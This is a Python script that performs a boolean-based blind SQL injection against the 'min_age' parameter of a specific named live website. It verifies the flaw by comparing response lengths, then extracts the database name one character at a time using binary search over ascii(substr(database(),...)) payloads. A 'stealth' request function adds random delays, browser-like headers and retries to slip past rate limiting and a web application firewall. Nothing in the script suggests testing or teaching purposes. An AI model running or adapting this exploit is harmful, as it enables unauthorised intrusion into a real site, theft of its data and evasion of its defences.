import requests
import time
import random
import sys

TARGET = "https://web.kelasdata.co.id/instructor-finder"

# Headers that worked previously
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'Referer': 'https://web.kelasdata.co.id/'
}

# Threshold from previous successful tests
THRESHOLD = 90000 

def stealth_request(payload):
    """
    Makes a request with:
    1. Random delay to avoid rate limiting
    2. Retry logic for network/WAF temporary blocks
    """
    max_retries = 5
    base_delay = 2.0 # Minimum 2 seconds delay
    
    for attempt in range(max_retries):
        try:
            # Sleep to be stealthy
            sleep_time = base_delay + random.random() * 2 # Random 2-4 seconds
            if attempt > 0:
                print(f"    [!] Retrying in {int(sleep_time*2)}s (Attempt {attempt+1})...")
                time.sleep(sleep_time * 2) 
            else:
                time.sleep(sleep_time)

            r = requests.get(TARGET, params={"min_age": payload}, headers=HEADERS, timeout=30)
            
            if r.status_code == 200:
                return len(r.text)
            elif r.status_code == 415 or r.status_code == 403:
                print(f"    [!] WAF Blocked ({r.status_code}). Waiting 60s...")
                time.sleep(60) # Long wait on block
            else:
                print(f"    [!] Unexpected status: {r.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"    [!] Network error: {e}. Waiting...")
            time.sleep(10)
            
    return 0

def get_db_name():
    print("[*] Starting Stealth Extraction for DB Name...")
    extracted_name = ""
    
    # We estimate length around 10-20 chars usually, let's just loop
    for i in range(1, 30):
        low = 32
        high = 126
        found = False
        
        while low <= high:
            mid = (low + high) // 2
            payload = f"1 AND (ascii(substr(database(),{i},1)) > {mid})"
            
            resp_len = stealth_request(payload)
            
            if resp_len > THRESHOLD:
                low = mid + 1
            else:
                high = mid - 1
        
        # Char found at `low`
        if low > 126 or low < 32:
            break # End of string
            
        char = chr(low)
        extracted_name += char
        print(f"    [+] Found char: {char} | Current: {extracted_name}")
        sys.stdout.flush()
        
    return extracted_name

if __name__ == "__main__":
    print(f"[*] Target: {TARGET}")
    print("[*] Mode: Stealth (Delays enabled)")
    
    # Verify Vulnerability First
    print("[*] Verifying Vulnerability...")
    len_true = stealth_request("1 AND 1=1")
    len_false = stealth_request("1 AND 1=2")
    
    print(f"    TRUE Length : {len_true}")
    print(f"    FALSE Length: {len_false}")
    
    if abs(len_true - len_false) > 10000:
        print("    [+] CONFIRMED VULNERABLE!")
        db = get_db_name()
        print(f"\n[+] Final Database Name: {db}")
    else:
        print("    [-] Checks failed or WAF blocking everything.")
